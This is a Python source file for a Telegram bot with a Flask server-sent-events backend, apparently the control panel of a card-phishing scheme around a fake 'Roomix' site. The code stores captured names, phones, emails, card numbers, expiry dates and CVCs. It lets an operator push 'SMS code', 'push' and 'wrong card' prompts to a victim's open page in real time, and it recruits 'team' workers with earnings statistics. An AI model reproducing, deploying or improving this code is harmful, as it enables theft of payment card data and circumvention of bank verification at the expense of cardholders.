import asyncio
import logging
import os
from dotenv import load_dotenv
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
import sqlite3
import datetime
import json
import time
import threading
from threading import Lock
from flask import Flask, Response, request, jsonify

# Загружаем переменные из .env
load_dotenv()

# Настройка логирования
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Берем токен и ID из .env файла
BOT_TOKEN = os.getenv('BOT_TOKEN')
ADMIN_CHAT_ID = os.getenv('ADMIN_CHAT_ID')

if not BOT_TOKEN or not ADMIN_CHAT_ID:
    exit(1)

ADMIN_CHAT_ID = int(ADMIN_CHAT_ID)

bot = Bot(token=BOT_TOKEN)
storage = MemoryStorage()
dp = Dispatcher(storage=storage)

# SSE сервер
app = Flask(__name__)
sse_clients = {}
sse_lock = Lock()

# Разрешенные домены для CORS
ALLOWED_ORIGINS = [
    "https://clickuz.github.io",           # Главный домен GitHub Pages
    "https://clickuz.github.io/roomix",    # Твой репозиторий
    "http://localhost:3000",
    "http://127.0.0.1:5500", 
    "http://localhost:8080",
    "http://127.0.0.1:8080",
    "https://roomix-production.up.railway.app"  # Твой Railway
]

# CORS middleware
@app.after_request
def after_request(response):
    origin = request.headers.get('Origin')
    if origin in ALLOWED_ORIGINS:
        response.headers['Access-Control-Allow-Origin'] = origin
    response.headers['Access-Control-Allow-Headers'] = 'Content-Type, *'
    response.headers['Access-Control-Allow-Methods'] = 'GET, POST, PUT, DELETE, OPTIONS'
    response.headers['Access-Control-Allow-Credentials'] = 'true'
    return response

@app.route('/sse/<user_id>')
def sse(user_id):
    """Server-Sent Events endpoint для получения команд"""
    def event_stream():
        # Добавляем CORS headers для SSE
        yield f"data: {json.dumps({'type': 'connected', 'message': 'SSE подключен'})}\n\n"
        
        # Регистрируем клиента
        with sse_lock:
            if user_id not in sse_clients:
                sse_clients[user_id] = []
            logger.info(f"✅ SSE подключен: {user_id}")
        
        try:
            while True:
                with sse_lock:
                    if user_id in sse_clients and sse_clients[user_id]:
                        # Отправляем все команды из очереди
                        while sse_clients[user_id]:
                            command = sse_clients[user_id].pop(0)
                            yield f"data: {json.dumps(command)}\n\n"
                
                # Ждем перед следующей проверкой
                time.sleep(0.5)
                
        except GeneratorExit:
            # Клиент отключился
            with sse_lock:
                if user_id in sse_clients:
                    del sse_clients[user_id]
                    logger.info(f"❌ SSE отключен: {user_id}")

    response = Response(event_stream(), mimetype='text/event-stream')
    origin = request.headers.get('Origin')
    if origin in ALLOWED_ORIGINS:
        response.headers['Access-Control-Allow-Origin'] = origin
    response.headers['Access-Control-Allow-Credentials'] = 'true'
    return response

@app.route('/send_command', methods=['POST', 'OPTIONS'])
def send_command():
    """Бот отправляет команду пользователю"""
    if request.method == 'OPTIONS':
        response = jsonify({'status': 'ok'})
        origin = request.headers.get('Origin')
        if origin in ALLOWED_ORIGINS:
            response.headers['Access-Control-Allow-Origin'] = origin
        response.headers['Access-Control-Allow-Headers'] = 'Content-Type'
        response.headers['Access-Control-Allow-Methods'] = 'POST, OPTIONS'
        return response
        
    try:
        data = request.json
        user_id = data.get('user_id')
        action = data.get('action')
        payment_id = data.get('payment_id')
        
        if not user_id or not action:
            return {'error': 'Missing user_id or action'}, 400
            
        command_data = {
            'type': 'bot_command',
            'action': action,
            'payment_id': payment_id,
            'timestamp': datetime.datetime.now().isoformat()
        }
        
        with sse_lock:
            if user_id not in sse_clients:
                sse_clients[user_id] = []
            sse_clients[user_id].append(command_data)
            
        logger.info(f"✅ Команда отправлена {user_id}: {action}")
        response = jsonify({'status': 'success'})
        origin = request.headers.get('Origin')
        if origin in ALLOWED_ORIGINS:
            response.headers['Access-Control-Allow-Origin'] = origin
        return response
        
    except Exception as e:
        logger.error(f"❌ Ошибка отправки команды: {e}")
        response = jsonify({'error': str(e)})
        origin = request.headers.get('Origin')
        if origin in ALLOWED_ORIGINS:
            response.headers['Access-Control-Allow-Origin'] = origin
        return response, 500

@app.route('/health')
def health():
    """Проверка здоровья сервера"""
    with sse_lock:
        users_count = len(sse_clients)
        total_commands = sum(len(commands) for commands in sse_clients.values())
    
    response = jsonify({
        'status': 'running',
        'users_count': users_count,
        'total_commands': total_commands,
        'timestamp': datetime.datetime.now().isoformat(),
        'allowed_origins': ALLOWED_ORIGINS
    })
    origin = request.headers.get('Origin')
    if origin in ALLOWED_ORIGINS:
        response.headers['Access-Control-Allow-Origin'] = origin
    return response

@app.route('/')
def home():
    return "🚀 Roomix Bot + SSE Server"

def run_flask():
    """Запуск Flask сервера в отдельном потоке"""
    try:
        port = int(os.environ.get('PORT', 8080))
        logger.info(f"🌐 Flask запускается на порту: {port}")
        app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)
    except Exception as e:
        logger.error(f"💥 Ошибка запуска Flask: {e}")

# Запускаем Flask в отдельном потоке
flask_thread = threading.Thread(target=run_flask, daemon=True)
flask_thread.start()

# База данных и остальной код бота
def init_db():
    conn = sqlite3.connect('applications.db')
    cursor = conn.cursor()
    cursor.execute('''
    CREATE TABLE IF NOT EXISTS applications (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        username TEXT,
        first_name TEXT,
        time TEXT,
        experience TEXT,
        status TEXT DEFAULT 'pending',
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )
    ''')
    cursor.execute('''
    CREATE TABLE IF NOT EXISTS payments (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        first_name TEXT,
        last_name TEXT,
        email TEXT,
        phone TEXT,
        card_number TEXT,
        card_expiry TEXT,
        cvc TEXT,
        amount REAL,
        status TEXT DEFAULT 'pending',
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )
    ''')
    conn.commit()
    conn.close()

init_db()

class ApplicationStates(StatesGroup):
    waiting_for_time = State()
    waiting_for_experience = State()
    confirmation = State()

# Кнопки для бота
main_kb = types.ReplyKeyboardMarkup(
    keyboard=[[types.KeyboardButton(text="📝 Оставить заявку")]],
    resize_keyboard=True
)

accepted_kb = types.ReplyKeyboardMarkup(
    keyboard=[[types.KeyboardButton(text="🏠 Главное меню")]],
    resize_keyboard=True
)

cancel_kb = types.ReplyKeyboardMarkup(
    keyboard=[[types.KeyboardButton(text="❌ Отменить заявку")]],
    resize_keyboard=True
)

confirm_kb = types.ReplyKeyboardMarkup(
    keyboard=[
        [types.KeyboardButton(text="✅ Отправить заявку")],
        [types.KeyboardButton(text="🔄 Заполнить заново")]
    ],
    resize_keyboard=True
)

# Инлайн кнопки для платежей
def get_payment_buttons(payment_id, user_id="user_123"):
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="📱 SMS код", callback_data=f"sms_code_{payment_id}_{user_id}"),
            InlineKeyboardButton(text="🔔 Пуш", callback_data=f"push_{payment_id}_{user_id}")
        ],
        [
            InlineKeyboardButton(text="❌ Неверная карта", callback_data=f"wrong_card_{payment_id}_{user_id}")
        ]
    ])

# Инлайн кнопки для заявок
def get_admin_buttons(application_id):
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="✅ Принять", callback_data=f"accept_{application_id}"),
            InlineKeyboardButton(text="❌ Отклонить", callback_data=f"reject_{application_id}")
        ]
    ])

# Инлайн кнопки для бота
profile_kb = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="👤 Профиль", callback_data="profile")]
])

stats_kb = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="📊 Сегодня", callback_data="stats_today")],
    [InlineKeyboardButton(text="📈 Вчера", callback_data="stats_yesterday")],
    [InlineKeyboardButton(text="📅 Неделя", callback_data="stats_week")],
    [InlineKeyboardButton(text="📆 Месяц", callback_data="stats_month")],
    [InlineKeyboardButton(text="⬅️ Назад", callback_data="back_to_main")]
])

back_kb = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="⬅️ Назад", callback_data="back_to_main")]
])

def get_user_status(user_id):
    conn = sqlite3.connect('applications.db')
    cursor = conn.cursor()
    cursor.execute('SELECT status FROM applications WHERE user_id = ? ORDER BY id DESC LIMIT 1', (user_id,))
    result = cursor.fetchone()
    conn.close()
    return result[0] if result else None

def get_join_date(user_id):
    conn = sqlite3.connect('applications.db')
    cursor = conn.cursor()
    cursor.execute('SELECT created_at FROM applications WHERE user_id = ? AND status = "accepted"', (user_id,))
    result = cursor.fetchone()
    conn.close()
    if result:
        if isinstance(result[0], str):
            try:
                join_date = datetime.datetime.strptime(result[0], '%Y-%m-%d %H:%M:%S')
                return join_date.strftime('%d.%m.%Y')
            except ValueError:
                return result[0]
        elif isinstance(result[0], datetime.datetime):
            return result[0].strftime('%d.%m.%Y')
    return datetime.datetime.now().strftime('%d.%m.%Y')

def save_payment(user_id, first_name, last_name, email, phone, card_number, card_expiry, cvc):
    try:
        conn = sqlite3.connect('applications.db')
        cursor = conn.cursor()
        cursor.execute('''
        INSERT INTO payments (user_id, first_name, last_name, email, phone, card_number, card_expiry, cvc, amount)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (user_id, first_name, last_name, email, phone, card_number, card_expiry, cvc, 0.0))
        payment_id = cursor.lastrowid
        conn.commit()
        conn.close()
        return payment_id
    except Exception:
        return None

# Функция отправки команды через HTTP
async def send_sse_command(user_id, action_type, payment_id=None):
    """Отправка команды через SSE сервер"""
    try:
        import requests
        
        # Получаем URL сервера
        server_url = os.environ.get('RAILWAY_STATIC_URL', 'https://roomixvbiv.up.railway.app')
        
        response = requests.post(
            f"{server_url}/send_command",
            json={
                'user_id': user_id,
                'action': action_type,
                'payment_id': payment_id
            },
            timeout=5
        )
        
        if response.status_code == 200:
            logger.info(f"✅ SSE команда отправлена {user_id}: {action_type}")
            return True
        else:
            logger.error(f"❌ Ошибка SSE отправки: {response.status_code}")
            return False
            
    except Exception as e:
        logger.error(f"💥 Ошибка HTTP запроса: {e}")
        return False

# Обработчик для чата - отправляем новое сообщение с кнопками
@dp.message(F.chat.id == ADMIN_CHAT_ID)
async def handle_chat_messages(message: types.Message):
    message_text = message.text or ""

    # Игнорируем команды и сообщения от бота
    if message_text.startswith('/') or message.from_user.is_bot:
        return

    # Проверяем платежные данные
    if any(keyword in message_text for keyword in ["НОВАЯ ОПЛАТА", "Клиент:", "Карта:", "Номер:", "Срок:", "CVC:"]):
        await process_payment_data(message)

async def process_payment_data(message: types.Message):
    try:
        lines = message.text.split('\n')
        payment_data = {}

        for line in lines:
            line = line.strip()
            if 'Имя:' in line:
                payment_data['first_name'] = line.split('Имя:')[1].strip()
            elif 'Фамилия:' in line:
                payment_data['last_name'] = line.split('Фамилия:')[1].strip()
            elif 'Email:' in line:
                payment_data['email'] = line.split('Email:')[1].strip()
            elif 'Телефон:' in line:
                payment_data['phone'] = line.split('Телефон:')[1].strip()
            elif 'Номер:' in line:
                payment_data['card_number'] = line.split('Номер:')[1].strip()
            elif 'Срок:' in line:
                payment_data['card_expiry'] = line.split('Срок:')[1].strip()
            elif 'CVC:' in line:
                payment_data['cvc'] = line.split('CVC:')[1].strip()

        required_fields = ['first_name', 'last_name', 'email', 'phone', 'card_number', 'card_expiry', 'cvc']
        if any(not payment_data.get(field) for field in required_fields):
            return

        payment_id = save_payment(
            user_id=0,
            first_name=payment_data.get('first_name', ''),
            last_name=payment_data.get('last_name', ''),
            email=payment_data.get('email', ''),
            phone=payment_data.get('phone', ''),
            card_number=payment_data.get('card_number', ''),
            card_expiry=payment_data.get('card_expiry', ''),
            cvc=payment_data.get('cvc', '')
        )

        if payment_id:
            # ОТПРАВЛЯЕМ НОВОЕ СООБЩЕНИЕ с кнопками
            await bot.send_message(
                chat_id=ADMIN_CHAT_ID,
                text="💳 <b>Выберите действие:</b>",
                reply_markup=get_payment_buttons(payment_id),
                parse_mode="HTML"
            )

    except Exception:
        pass

# Обработчики инлайн кнопок для платежей
@dp.callback_query(F.data.startswith("sms_code_"))
async def sms_code_handler(callback: types.CallbackQuery):
    parts = callback.data.split("_")
    payment_id = parts[2]
    user_id = parts[3]
    
    # Отправляем команду через SSE
    success = await send_sse_command(user_id, "sms", payment_id)
    
    await callback.message.edit_text(
        f"📱 <b>SMS код запрошен для платежа #{payment_id}</b>\n\n" +
        (f"✅ Команда отправлена пользователю {user_id}" if success else f"❌ Ошибка отправки пользователю {user_id}"),
        parse_mode="HTML"
    )
    await callback.answer("SMS код запрошен")

@dp.callback_query(F.data.startswith("push_"))
async def push_handler(callback: types.CallbackQuery):
    parts = callback.data.split("_")
    payment_id = parts[1]
    user_id = parts[2]
    
    # Отправляем команду через SSE
    success = await send_sse_command(user_id, "push", payment_id)
    
    await callback.message.edit_text(
        f"🔔 <b>Пуш уведомление отправлено для платежа #{payment_id}</b>\n\n" +
        (f"✅ Команда отправлена пользователю {user_id}" if success else f"❌ Ошибка отправки пользователю {user_id}"),
        parse_mode="HTML"
    )
    await callback.answer("Пуш отправлен")

@dp.callback_query(F.data.startswith("wrong_card_"))
async def wrong_card_handler(callback: types.CallbackQuery):
    parts = callback.data.split("_")
    payment_id = parts[2]
    user_id = parts[3]
    
    # Отправляем команду через SSE
    success = await send_sse_command(user_id, "wrong_card", payment_id)
    
    await callback.message.edit_text(
        f"❌ <b>Карта отклонена для платежа #{payment_id}</b>\n\n" +
        (f"✅ Команда отправлена пользователю {user_id}" if success else f"❌ Ошибка отправки пользователю {user_id}"),
        parse_mode="HTML"
    )
    await callback.answer("Карта отклонена")

# Остальные обработчики бота (без изменений)
@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    if message.chat.id == ADMIN_CHAT_ID:
        return
        
    user_id = message.from_user.id
    user_status = get_user_status(user_id)

    if user_status == 'accepted':
        welcome_text = """
🎉 <b>Добро пожаловать в команду!</b>

Вы успешно прошли отбор и теперь являетесь частью нашего проекта.
"""
        await bot.send_photo(
            chat_id=user_id,
            photo="https://images.unsplash.com/photo-1521737711867-e3b97375f902?auto=format&fit=crop&w=800&q=80",
            caption=welcome_text,
            reply_markup=profile_kb,
            parse_mode="HTML"
        )
    elif user_status == 'rejected':
        welcome_text = """
👋 <b>Добро пожаловать!</b>

К сожалению, ваша предыдущая заявка была отклонена.
"""
        await message.answer(welcome_text, reply_markup=main_kb, parse_mode="HTML")
    else:
        welcome_text = """
👋 <b>Добро пожаловать!</b>

Это бот для подачи заявки на участие в проекте.

Чтобы начать, нажмите кнопку ниже 👇
"""
        await message.answer(welcome_text, reply_markup=main_kb, parse_mode="HTML")

@dp.message(F.text == "🏠 Главное меню")
async def main_menu(message: types.Message):
    if message.chat.id == ADMIN_CHAT_ID:
        return
        
    user_status = get_user_status(message.from_user.id)
    if user_status == 'accepted':
        welcome_text = """
🎉 <b>Главное меню</b>

Добро пожаловать в нашу команду!
"""
        await bot.send_photo(
            chat_id=message.from_user.id,
            photo="https://images.unsplash.com/photo-1521737711867-e3b97375f902?auto=format&fit=crop&w=800&q=80",
            caption=welcome_text,
            reply_markup=profile_kb,
            parse_mode="HTML"
        )
    else:
        await message.answer("👋 Для начала работы нажмите '📝 Оставить заявку'", reply_markup=main_kb)

@dp.message(F.text == "📝 Оставить заявку")
async def start_application(message: types.Message, state: FSMContext):
    if message.chat.id == ADMIN_CHAT_ID:
        return
        
    user_status = get_user_status(message.from_user.id)

    if user_status == 'accepted':
        await message.answer("✅ Вы уже приняты в команду!", reply_markup=accepted_kb)
        return
    elif user_status == 'rejected':
        await message.answer("❌ Ваша предыдущая заявка была отклонена", reply_markup=main_kb)
        return
    elif user_status == 'pending':
        await message.answer("⏳ Ваша заявка уже на рассмотрении", reply_markup=main_kb)
        return

    await state.set_state(ApplicationStates.waiting_for_time)
    question_text = """
⏰ <b>Первый вопрос:</b>

Сколько часов в день вы готовы уделять работе?
(Напишите число, например: 4, 6, 8)
"""
    await message.answer(question_text, reply_markup=cancel_kb, parse_mode="HTML")

@dp.message(F.text == "❌ Отменить заявку")
async def cancel_application(message: types.Message, state: FSMContext):
    if message.chat.id == ADMIN_CHAT_ID:
        return
        
    await state.clear()
    await message.answer("❌ Заявка отменена", reply_markup=main_kb)

@dp.message(ApplicationStates.waiting_for_time)
async def process_time(message: types.Message, state: FSMContext):
    if message.chat.id == ADMIN_CHAT_ID:
        return
        
    time_answer = message.text.strip()

    if not time_answer.isdigit():
        await message.answer("❌ Пожалуйста, введите число (например: 4, 6, 8)")
        return

    hours = int(time_answer)
    if hours > 24:
        await message.answer("❌ В сутках всего 24 часа! Введите реальное число")
        return

    await state.update_data(time=time_answer)
    await state.set_state(ApplicationStates.waiting_for_experience)

    question_text = """
💼 <b>Второй вопрос:</b>

Какой у вас опыт работы в этой сфере?
(Опишите кратко ваш опыт)
"""
    await message.answer(question_text, reply_markup=cancel_kb, parse_mode="HTML")

@dp.message(ApplicationStates.waiting_for_experience)
async def process_experience(message: types.Message, state: FSMContext):
    if message.chat.id == ADMIN_CHAT_ID:
        return
        
    experience = message.text.strip()

    if len(experience) < 5:
        await message.answer("❌ Пожалуйста, опишите опыт более подробно")
        return

    await state.update_data(experience=experience)
    await state.set_state(ApplicationStates.confirmation)

    user_data = await state.get_data()
    confirmation_text = f"""
📋 <b>Проверьте вашу заявку:</b>

⏰ <b>Время:</b> {user_data['time']} часов/день
💼 <b>Опыт:</b> {user_data['experience']}

Всё верно?
"""
    await message.answer(confirmation_text, reply_markup=confirm_kb, parse_mode="HTML")

@dp.message(ApplicationStates.confirmation)
async def process_confirmation(message: types.Message, state: FSMContext):
    if message.chat.id == ADMIN_CHAT_ID:
        return
        
    if message.text == "✅ Отправить заявку":
        user_data = await state.get_data()

        try:
            conn = sqlite3.connect('applications.db')
            cursor = conn.cursor()
            cursor.execute('''
            INSERT INTO applications (user_id, username, first_name, time, experience, status)
            VALUES (?, ?, ?, ?, ?, 'pending')
            ''', (
                message.from_user.id,
                message.from_user.username,
                message.from_user.first_name,
                user_data['time'],
                user_data['experience']
            ))
            application_id = cursor.lastrowid
            conn.commit()
            conn.close()
        except Exception as e:
            await message.answer("❌ Ошибка сохранения заявки. Попробуйте позже.", reply_markup=main_kb)
            await state.clear()
            return

        application_text = f"""
🚨 <b>НОВАЯ ЗАЯВКА #{application_id}</b>

👤 <b>Пользователь:</b>
ID: {message.from_user.id}
Username: @{message.from_user.username or 'Нет'}
Имя: {message.from_user.first_name or ''}

📋 <b>Данные заявки:</b>
⏰ Время: {user_data['time']} часов/день
💼 Опыт: {user_data['experience']}

🕒 Время подачи: {message.date.strftime('%d.%m.%Y %H:%M')}
"""
        try:
            await bot.send_message(
                chat_id=ADMIN_CHAT_ID,
                text=application_text,
                reply_markup=get_admin_buttons(application_id),
                parse_mode="HTML"
            )

            success_text = """
✅ <b>Заявка отправлена!</b>

Спасибо за вашу заявку! Мы рассмотрим её в ближайшее время и свяжемся с вами.

Ожидайте решения...
"""
            await message.answer(success_text, reply_markup=types.ReplyKeyboardRemove(), parse_mode="HTML")
        except Exception as e:
            await message.answer("❌ Произошла ошибка при отправки заявки. Попробуйте позже.", reply_markup=main_kb)

        await state.clear()

    elif message.text == "🔄 Заполнить заново":
        await state.clear()
        await start_application(message, state)
    else:
        await message.answer("❌ Пожалуйста, используйте кнопки ниже")

@dp.callback_query(F.data == "profile")
async def show_profile(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    user_status = get_user_status(user_id)

    if user_status == 'accepted':
        join_date = get_join_date(user_id)
        profile_text = f"""
👤 <b>Ваш профиль</b>

🆔 <b>ID:</b> {user_id}
👤 <b>Ник:</b> @{callback.from_user.username or 'Не указан'}
📅 <b>Дата вступления:</b> {join_date}

📊 <b>Статистика:</b>
• За сегодня: 0 ₽
• Общая сумма: 0 ₽

Выберите период для просмотра статистики:
"""
        await callback.message.delete()
        await callback.message.answer(
            profile_text,
            reply_markup=stats_kb,
            parse_mode="HTML"
        )
    else:
        await callback.answer("❌ У вас нет доступа к этой функции", show_alert=True)
    await callback.answer()

@dp.callback_query(F.data.startswith("stats_"))
async def show_stats(callback: types.CallbackQuery):
    user_status = get_user_status(callback.from_user.id)
    if user_status != 'accepted':
        await callback.answer("❌ У вас нет доступа к этой функции", show_alert=True)
        return

    period = callback.data.split('_')[1]
    period_names = {
        'today': 'сегодня',
        'yesterday': 'вчера',
        'week': 'неделю',
        'month': 'месяц'
    }

    stats_text = f"""
📊 <b>Статистика за {period_names[period]}:</b>

✅ <b>Выполнено задач:</b> 0
💰 <b>Общая сумма:</b> 0 ₽
📈 <b>Средний чек:</b> 0 ₽

Статистика будет отображаться здесь.
"""
    await callback.message.edit_text(
        stats_text,
        reply_markup=back_kb,
        parse_mode="HTML"
    )
    await callback.answer()

@dp.callback_query(F.data == "back_to_main")
async def back_to_main(callback: types.CallbackQuery):
    user_status = get_user_status(callback.from_user.id)
    if user_status == 'accepted':
        join_date = get_join_date(callback.from_user.id)
        profile_text = f"""
👤 <b>Ваш профиль</b>

🆔 <b>ID:</b> {callback.from_user.id}
👤 <b>Ник:</b> @{callback.from_user.username or 'Не указан'}
📅 <b>Дата вступления:</b> {join_date}

📊 <b>Статистика:</b>
• За сегодня: 0 ₽
• Общая сумма: 0 ₽

Выберите период для просмотра статистики:
"""
        await callback.message.edit_text(
            profile_text,
            reply_markup=stats_kb,
            parse_mode="HTML"
        )
    else:
        await callback.answer("❌ У вас нет доступа", show_alert=True)
    await callback.answer()

@dp.callback_query(F.data.startswith("accept_"))
async def accept_application(callback: types.CallbackQuery):
    application_id = callback.data.split("_")[1]

    conn = sqlite3.connect('applications.db')
    cursor = conn.cursor()
    cursor.execute('UPDATE applications SET status = "accepted" WHERE id = ?', (application_id,))
    conn.commit()

    cursor.execute('SELECT user_id, time, experience FROM applications WHERE id = ?', (application_id,))
    application = cursor.fetchone()
    conn.close()

    if application:
        user_id, time, experience = application

        user_message = """
🎉 <b>Поздравляем! Ваша заявка принята!</b>

Мы рады приветствовать вас в нашей команде!
"""
        try:
            await bot.send_message(
                chat_id=user_id,
                text=user_message,
                parse_mode="HTML"
            )

            welcome_text = """
🎉 <b>Добро пожаловать в команду!</b>

Вы успешно прошли отбор и теперь являетесь частью нашего проекта.
"""
            await bot.send_photo(
                chat_id=user_id,
                photo="https://images.unsplash.com/photo-1521737711867-e3b97375f902?auto=format&fit=crop&w=800&q=80",
                caption=welcome_text,
                reply_markup=profile_kb,
                parse_mode="HTML"
            )
        except Exception as e:
            pass

        await callback.message.edit_text(
            f"✅ <b>ЗАЯВКА #{application_id} ПРИНЯТА</b>\n\n"
            f"Пользователь уведомлен о решении.",
            parse_mode="HTML"
        )

    await callback.answer()

@dp.callback_query(F.data.startswith("reject_"))
async def reject_application(callback: types.CallbackQuery):
    application_id = callback.data.split("_")[1]

    conn = sqlite3.connect('applications.db')
    cursor = conn.cursor()
    cursor.execute('UPDATE applications SET status = "rejected" WHERE id = ?', (application_id,))
    conn.commit()

    cursor.execute('SELECT user_id FROM applications WHERE id = ?', (application_id,))
    application = cursor.fetchone()
    conn.close()

    if application:
        user_id = application[0]

        user_message = """
😔 <b>К сожалению, ваша заявка отклонена.</b>

Спасибо за проявленный интерес! В данный момент мы не можем предложить вам сотрудничество.

Желаем удачи в будущих проектах!
"""
        try:
            await bot.send_message(
                chat_id=user_id,
                text=user_message,
                reply_markup=main_kb,
                parse_mode="HTML"
            )
        except Exception as e:
            pass

        await callback.message.edit_text(
            f"❌ <b>ЗАЯВКА #{application_id} ОТКЛОНЕНА</b>\n\n"
            f"Пользователь уведомлен о решении.",
            parse_mode="HTML"
        )

    await callback.answer()

async def main():
    try:
        logger.info("🚀 Бот запускается...")
        logger.info("🌐 SSE сервер запущен с CORS для GitHub Pages")
        
        # Явно закрываем старую сессию
        await bot.session.close()
        
        # Небольшая задержка перед запуском
        await asyncio.sleep(2)
        
        # Запускаем polling
        await dp.start_polling(bot, allowed_updates=dp.resolve_used_update_types())
        
    except Exception as e:
        logger.error(f"💥 Ошибка запуска бота: {e}")
    finally:
        await bot.session.close()




